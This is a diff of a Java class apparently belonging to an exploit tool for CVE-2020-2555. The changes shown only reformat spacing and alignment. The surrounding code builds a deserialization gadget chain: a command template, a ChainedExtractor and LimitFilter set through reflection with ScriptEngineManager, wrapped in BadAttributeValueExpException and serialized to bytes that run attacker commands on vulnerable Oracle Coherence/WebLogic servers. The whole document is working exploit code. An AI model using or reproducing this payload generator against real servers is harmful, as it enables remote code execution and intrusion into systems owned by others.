@@ -19,7 +19,7 @@ public class CVE_2020_2555 {
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
 
         String className;
-        switch (type){
+        switch (type) {
             case command:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                 commandTemplate.cache();
@@ -74,9 +74,9 @@ public class CVE_2020_2555 {
 
 
         byte[] bytes = Cache.get(className);
-        if(bytes == null){
+        if (bytes == null) {
             String shortName = className.substring(className.lastIndexOf(".") + 1);
-            bytes =  Cache.get(shortName);
+            bytes = Cache.get(shortName);
         }
         String classCode = HexUtils.toHexString(bytes);
 
@@ -129,7 +129,7 @@ public class CVE_2020_2555 {
         };
 
         ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
-        LimitFilter limitFilter = new LimitFilter();
+        LimitFilter      limitFilter      = new LimitFilter();
 
         //m_comparator
         Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
@@ -142,13 +142,13 @@ public class CVE_2020_2555 {
         m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
+        Field                         field                         = badAttributeValueExpException.getClass().getDeclaredField("val");
         field.setAccessible(true);
         field.set(badAttributeValueExpException, limitFilter);
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(badAttributeValueExpException);
         bytes = baous.toByteArray();
         oos.close();
